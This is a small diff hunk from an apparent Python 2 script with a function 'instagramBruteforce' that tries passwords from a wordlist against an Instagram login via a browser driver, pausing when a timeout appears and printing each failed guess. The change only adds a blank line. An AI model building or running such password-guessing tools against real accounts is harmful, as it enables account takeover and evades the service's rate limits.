@@ -44,6 +44,7 @@ def instagramBruteforce(username, wordlist, delay):
             if timeout in driver.page_source:
                 print O + "[!] Timeout raised! Waiting... [!]" + W
                 sleep(300)
+
             print O + "[*] Username: %s | [*] Password: %s | Incorrect!\n" % (username, password) + W
             sleep(delay)
             assert (("Login") in driver.title)
